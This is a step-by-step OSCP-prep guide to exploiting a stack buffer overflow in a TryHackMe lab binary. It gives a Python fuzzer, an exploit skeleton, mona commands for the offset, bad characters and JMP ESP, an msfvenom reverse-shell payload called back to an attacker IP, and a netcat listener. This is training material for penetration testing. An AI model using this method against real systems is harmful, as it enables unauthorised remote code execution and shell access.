# Buffer Overflows - OSCP Prep

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

### Step 1: Ensure Mona is installed in Immunity Debugger

### Step 2: Launch Immunity Debugger, open relevant application, and run the application

### Step 3: Configure working folder with this command at the bottom of Immunity Debugger:

```
!mona config -set workingfolder [FILE-PATH]
```

Example:

```
!mona config -set workingfolder c:\mona\%p
```

### Step 4: Fuzz the application; Note the length of string that is needed to crash the application

Example Python Code for Fuzzing:

 ```
 #!/usr/bin/env python3

import socket, time, sys

ip = "10.10.237.191"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ```
  
 ### Step 5: Create exploit.py skeleton:
 
 Example exploit.py :
 
 ```
 import socket

ip = "10.10.237.191"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  ```
  
### Step 5: Generate cyclic pattern with this command:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [PATTERN-LENGTH]
```
*Make PATTERN-LENGTH 400 bytes longer than the string that crashed the application while fuzzing*
 
 ### Step 6: Paste output from Step 5 into payload variable of exploit.py
 
 ### Step 7: Restart application in Immunity, Run exploit.py from attack machine
 
 ### Step 8: After exploit.py crashes the application, run this command in Immunity to determine offset:
 
 ```
 !mona findmsp -distance [PATTERN-LENGTH]
 ```
 
 ### Step 9: Paste offset amount into the offset variable of exploit.py
 
 ### Step 10: Set retn variable to "BBBB" in exploit.py
 
 ### Step 11: Restart Application; Run exploit.py
 
 ### Step 12: Ensure EIP is under control (EIP should have: 42424242)
 
 ### Step 13: Create script to help generate bad characters

Example:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

### Step 14: Run Bad Characters Script

### Step 15: Paste Bad Characters output into payload variable of exploit.py

### Step 16: Re-open application in Immunity but do not run it

### Step 17: Generate byte array in Immunity with this command:

```
!mona bytearray -b "\x00"
```

### Step 18: Start application in Immunity; Run exploit.py on attack machine

### Step 19: Compare byte array with this command in Immunity to see possible bad characters:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a [ESP-ADDRESS]
```

### Step 19: Remove first bad character in the list in Step 19 from payload variable in exploit.py

### Step 20: Reopen Application but do not run it

### Step 21: Generate byte array again in Immunity with same command as last time, but make sure you add the bad character to the exception list

Example:
```
!mona bytearray -b "\x00\x07"
```

### Step 22: Repeat steps 18-21 until Step 19 says "Unmodified" in the Immunity logs (These are the bad characters)

### Step 23: In crashed or running state, find jump point in Immunity with this command:

```
!mona jmp -r esp -cpb [BAD-CHARACTERS]
```

### Step 24: Write jump point address discovered backwards into the retn variable of exploit.py

For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in exploit.py

### Step 25: Generate payload with this command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=4444 EXITFUNC=thread -b "[BAD-CHARACTORS]" -f c
```

### Step 26: Paste generated payload into payload variable of exploit.py

### Step 27: Add padding to exploit.py

Example:

```
padding = "\x90" * 16
```

### Step 28: Start netcat listener

Example:
```
nc -lnvp 4444
```

### Step 29: Restart application in Immunity, Run it, and run exploit.py from attack machine

### Step 30: Check listener, it should have a shell

## References

* https://tryhackme.com/room/bufferoverflowprep#
